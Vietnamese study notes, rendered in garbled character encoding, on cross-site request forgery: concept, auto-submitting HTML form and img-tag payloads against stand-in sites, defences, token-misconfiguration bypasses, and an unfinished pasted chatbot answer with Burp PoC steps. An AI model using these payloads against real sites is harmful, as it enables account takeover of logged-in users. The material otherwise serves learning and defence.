# Cross-Site Request Forgery (CSRF)

- Cross-site = tá»« trang web khÃ¡c
- Request = gá»­i yÃªu cáº§u
- Forgery = giáº£ máº¡o
## 1. KhÃ¡i niá»‡m
**Cross-Site Request Forgery (CSRF)** = Ã©p browser cá»§a náº¡n nhÃ¢n tá»± gá»­i yÃªu cáº§u Ä‘áº¿n má»™t website mÃ  náº¡n nhÃ¢n Ä‘ang Ä‘Äƒng nháº­p, mÃ  há» khÃ´ng há» biáº¿t.

Báº£n cháº¥t:
- Browser *tá»± Ä‘á»™ng gá»­i cookie session* cho website má»—i khi cÃ³ request Ä‘áº¿n Ä‘Ãºng domain.
- Náº¿u náº¡n nhÃ¢n Ä‘ang Ä‘Äƒng nháº­p = *cookie chÆ°a háº¿t háº¡n*, hacker cÃ³ thá»ƒ Ã©p browser cá»§a náº¡n nhÃ¢n gá»­i request Ä‘áº¿n website Ä‘Ã³.
- Server nhÃ¬n tháº¥y cookie trong request vÃ  *tÆ°á»Ÿng request Ä‘Ã³ lÃ  cá»§a náº¡n nhÃ¢n*.

=> VÃ¬ váº­y, CSRF khÃ´ng Ä‘Ã¡nh cáº¯p cookie, mÃ  dÃ¹ng cookie há»£p lá»‡ cá»§a náº¡n nhÃ¢n Ä‘á»ƒ thá»±c hiá»‡n hÃ nh Ä‘á»™ng thay há».

## 2. Äiá»u kiá»‡n Ä‘á»ƒ CSRF xáº£y ra
- CÃ³ hÃ nh Ä‘á»™ng quan trá»ng (Ä‘á»•i email, Ä‘á»•i pass, chuyá»ƒn tiá»nâ€¦)
- XÃ¡c thá»±c dÃ¹ng cookie (trÃ¬nh duyá»‡t tá»± gá»­i cookie session)
- KhÃ´ng cÃ³ tham sá»‘ khÃ³ Ä‘oÃ¡n (khÃ´ng yÃªu cáº§u máº­t kháº©u cÅ©, khÃ´ng cÃ³ CSRF tokenâ€¦)

## 3. VÃ­ dá»¥ CSRF: Äá»•i email
**BÆ°á»›c 1:**

User gá»­i request login Ä‘áº¿n server `vulnerable-website.com`. <br>-> Server sáº½ gá»­i láº¡i cookie cho user, vÃ  browser cá»§a user sáº½ lÆ°u cookie cho cÃ¡c request sau.

**BÆ°á»›c 2:**

Khi user muá»‘n Ä‘á»•i email, user gá»­i request Ä‘á»•i email kÃ¨m cookie tá»›i server.
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
-> Server kiá»ƒm tra cookie vÃ  gá»­i láº¡i form HTML Ä‘á»•i email cho user.

**BÆ°á»›c 3:**
<p><b><i>Trong trÆ°á»ng há»£p khÃ´ng bá»‹ táº¥n cÃ´ng</i></b></p>

User Ä‘iá»n form, áº¥n submit Ä‘á»ƒ gá»­i request POST (+cookie) Ä‘áº¿n server.<br>->Server kiá»ƒm tra cookie há»£p lá»‡ vÃ  cho phÃ©p Ä‘á»•i email.

<p><b><i>Trong trÆ°á»ng há»£p bá»‹ táº¥n cÃ´ng</i></b></p>

Attacker táº¡o 1 form giáº£ Ä‘á»ƒ user truy cáº­p. Form nÃ y cÃ³ thá»ƒ cho user tá»± Ä‘iá»n, hoáº·c cÃ³ sáºµn data Ä‘á»ƒ khi user truy cáº­p thÃ¬ tá»± Ä‘á»™ng gá»­i Ä‘i ngay láº­p tá»©c.

```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Giáº£i thÃ­ch:
- `<form action=".../email/change" method="POST">`: Ã‰p browser gá»­i request Ä‘áº¿n endpoint Ä‘á»•i email cá»§a website tháº­t.
- `<input type="hidden" name="email" value="pwned@evil-user.net">`: ChÃ¨n email mÃ  attacker muá»‘n thay tháº¿ cho email cá»§a náº¡n nhÃ¢n.
- `document.forms[0].submit();`: Tá»± Ä‘á»™ng gá»­i form ngay khi trang Ä‘Æ°á»£c má»Ÿ, khÃ´ng cáº§n thao tÃ¡c cá»§a ngÆ°á»i dÃ¹ng.

LÃºc nÃ y request Ä‘Æ°á»£c gá»­i Ä‘i dÆ°á»›i cookie cá»§a user.<br>Request trÃ´ng sáº½ giá»‘ng nhÆ°:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=pwned@evil-user.net
```
-> Server kiá»ƒm tra váº«n Ä‘Ãºng cookie thÃ¬ cho Ä‘á»•i email

=> Táº¥n cÃ´ng thÃ nh cÃ´ng.

## 4. CSRF Deliver Methods
Attacker cÃ³ thá»ƒ:
- Gá»­i link qua email/messenger
- NhÃºng payload trong website há» kiá»ƒm soÃ¡t
- Äáº·t trong comment cá»§a 1 website khÃ´ng lá»c HTML
- Náº¿u action lÃ  GET, táº¥n cÃ´ng cÃ²n dá»… hÆ¡n:

VD: `<img src="https://vulnerable.com/email/change?email=pwned@evil-user.net">`

## 5. CÃ¡c biá»‡n phÃ¡p phÃ²ng chá»‘ng CSRF
### 5.1. CSRF Token
**Ã tÆ°á»Ÿng**: Trong form HTML server gá»­i cho user Ä‘á»ƒ Ä‘iá»n mail má»›i, Ä‘Ã­nh kÃ¨m thÃªm 1 token (chuá»—i ngáº«u nhiÃªn) Ä‘á»ƒ xÃ¡c minh.

**CÃ¡ch hoáº¡t Ä‘á»™ng**:

- Khi user gá»­i request Ä‘á»•i email, server gá»­i láº¡i 1 form HTML kÃ¨m CSRF token Ä‘á»ƒ user Ä‘iá»n.
- Náº¿u khÃ´ng bá»‹ táº¥n cÃ´ng, user gá»­i láº¡i request kÃ¨m form HTML + CSRF token. Server kiá»ƒm tra token Ä‘Ãºng vÃ  cho Ä‘á»•i email.
- Ká»ƒ cáº£ attacker cÃ³ táº¡o 1 form giáº£ Ä‘á»ƒ gá»­i request báº±ng cookie cá»§a user, form giáº£ nÃ y cÅ©ng khÃ´ng cÃ³ CSRF token.

### 5.2. SameSite Cookie
SameSite lÃ  má»™t quy táº¯c cho cookie, quyáº¿t Ä‘á»‹nh khi nÃ o browswe gá»­i cookie Ä‘i cÃ¹ng vá»›i request. Má»¥c Ä‘Ã­ch chÃ­nh lÃ  ngÄƒn káº» xáº¥u lá»£i dá»¥ng cookie cá»§a báº¡n Ä‘á»ƒ lÃ m viá»‡c xáº¥u trÃªn trang khÃ¡c (CSRF).

- **Strict**: Request pháº£i cÃ¹ng site.

VÃ­ dá»¥: Báº¡n vÃ o mybank.com trá»±c tiáº¿p â†’ cookie gá»­i Ä‘i, Ä‘Äƒng nháº­p ok.<br>NhÆ°ng náº¿u báº¡n click link tá»« email hoáº·c tá»« facebook.com â†’ cookie khÃ´ng gá»­i â†’ khÃ´ng Ä‘Äƒng nháº­p Ä‘Æ°á»£c.

- **Lax**: Náº¿u khÃ¡c site, GET request gá»­i, POST request khÃ´ng gá»­i

VÃ­ dá»¥: Báº¡n click link tá»« email hoáº·c trang khÃ¡c â†’ cookie váº«n gá»­i cho request GET â†’ trang váº«n nháº­n diá»‡n báº¡n.

- **None**: Cookie luÃ´n Ä‘Æ°á»£c gá»­i, ká»ƒ cáº£ request tá»« trang khÃ¡c.

### 5.3. Kiá»ƒm tra Referer
Referrer (hoáº·c Referer) lÃ  header trong HTTP request, cho biáº¿t trang web trÆ°á»›c Ä‘Ã³ mÃ  ngÆ°á»i dÃ¹ng vá»«a click link hoáº·c gá»­i request tá»« Ä‘Ã³.

VÃ­ dá»¥: báº¡n Ä‘ang á»Ÿ `evil.com` vÃ  click link tá»›i `mybank.com`, request sáº½ cÃ³ header:
```
Referer: https://evil.com/
```

Khi server nháº­n request, server xem Referrer cÃ³ pháº£i lÃ  cÃ¹ng domain khÃ´ng:

- Náº¿u Referrer = domain cá»§a mÃ¬nh (`mybank.com`) â†’ cho phÃ©p request
- Náº¿u Referrer = domain khÃ¡c (`evil.com`) â†’ cháº·n request, vÃ¬ cÃ³ thá»ƒ lÃ  CSRF.

## 6. Má»™t sá»‘ cáº¥u hÃ¬nh CSRF token lá»—i
### Web chá»‰ kiá»ƒm tra CSRF token vá»›i POST

Má»™t sá»‘ web cho phÃ©p GET thay Ä‘á»•i dá»¯ liá»‡u, VD:
```
GET /email/change?email=pwned@evil.com
```
Khi Ä‘Ã³ náº¿u chá»‰ kiá»ƒm tra CSRF token vá»›i POST, attacker sáº½ chuyá»ƒn sang GET.

### Token bá»‹ bá» qua khi thiáº¿u tham sá»‘

Má»™t sá»‘ web code kiá»ƒu:
```
if request.POST['csrf'] exists:
    verify(token)
else:
    skip verification
```
Náº¿u `csrf=` (rá»—ng), webâ€¦ khÃ´ng check luÃ´n.


### Token khÃ´ng gáº¯n vá»›i session

Web chá»‰ test: *Token cÃ³ náº±m trong database khÃ´ng?*<br>
â†’ Náº¿u token chá»‰ cáº§n Ä‘Ãºng format hoáº·c náº±m trong danh sÃ¡ch há»£p lá»‡ = attacker dÃ¹ng token cá»§a chÃ­nh háº¯n.

Attacker tá»± truy cáº­p website:
- Láº¥y token há»£p lá»‡ cá»§a mÃ¬nh: `csrf=ABC123`
- Gá»­i token nÃ y trong request giáº£ máº¡o tá»›i victim:
```
<form action="https://victim.com/transfer" method="POST">
  <input type="hidden" name="csrf" value="ABC123">
</form>
```
=> Web chá»‰ kiá»ƒm tra token tá»“n táº¡i â†’ khÃ´ng biáº¿t token Ä‘Ã³ thuá»™c session nÃ o â†’ bypass.

### Token náº±m trong cookie KHÃ”NG pháº£i cookie session
------------------------------------------------------CHUWA XONG
Náº¿u token Ä‘Æ°á»£c lÆ°u trong cookie riÃªng, vÃ­ dá»¥:

Set-Cookie: csrf=ABC123


Attacker hoÃ n toÃ n cÃ³ thá»ƒ Ä‘áº·t cookie Ä‘Ã³ vÃ o browser náº¡n nhÃ¢n báº±ng cÃ¡ch:

Sá»­ dá»¥ng subdomain cá»§a website (náº¿u misconfigured)

Hoáº·c thÃ´ng qua script trÃªn domain khÃ¡c bá»‹ lá»—i

Hoáº·c khiáº¿n user truy cáº­p subdomain attacker kiá»ƒm soÃ¡t

Sau Ä‘Ã³ attacker set:

csrf=AAAAAA


â¡ï¸ Náº¡n nhÃ¢n dÃ¹ng cookie token attacker táº¡o â†’ attacker biáº¿t token â†’ dá»… dÃ ng gá»­i request khá»›p token.

âŒ 5. Double-Submit Cookie sai (token náº±m trong cookie + body cÃ¹ng giÃ¡ trá»‹)

Má»™t sá»‘ web dÃ¹ng cÆ¡ cháº¿:

Cookie chá»©a token:

Cookie: csrf=ABC123


Body cÅ©ng gá»­i token giá»‘ng há»‡t:

csrf=ABC123


Server kiá»ƒm tra:

â€œToken trong cookie == token trong formâ€ â†’ OK.

âš ï¸ NhÆ°ng attacker cÅ©ng cÃ³ thá»ƒ tá»± Ä‘áº·t cookie csrf cho náº¡n nhÃ¢n (giá»‘ng lá»—i #4), sau Ä‘Ã³ gá»­i form:

Attacker set cookie:

csrf=ZZZZZZ


Attacker gá»­i request:

csrf=ZZZZZZ


â¡ï¸ Cookie vÃ  body trÃ¹ng nhau â†’ bypass 100%.

ğŸ§° LÃ m CSRF exploit cá»±c nhanh báº±ng Burp Suite

Burp cÃ³ sáºµn tool táº¡o PoC.

CÃ¡ch lÃ m:

Gá»­i request Ä‘áº¿n Burp Repeater

Chuá»™t pháº£i â†’ Generate CSRF PoC

Burp táº¡o ra HTML:

<html>
  <body>
    <form action="https://victim.com/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>


DÃ¡n vÃ o attacker.com â†’ náº¡n nhÃ¢n truy cáº­p lÃ  toang.

Báº¡n muá»‘n mÃ¬nh lÃ m gÃ¬ tiáº¿p?

MÃ¬nh cÃ³ thá»ƒ:

âœ… Váº½ sÆ¡ Ä‘á»“ mÃ´ phá»ng tá»«ng lá»—i cho báº¡n
âœ… Táº¡o vÃ­ dá»¥ web cÃ³ token nhÆ°ng váº«n bá»‹ hack
âœ… Viáº¿t checklist â€œCSRF Token cáº¥u hÃ¬nh Ä‘Ãºngâ€
âœ… HÆ°á»›ng dáº«n báº¡n test CSRF trÃªn Burp

Báº¡n muá»‘n má»¥c nÃ o?
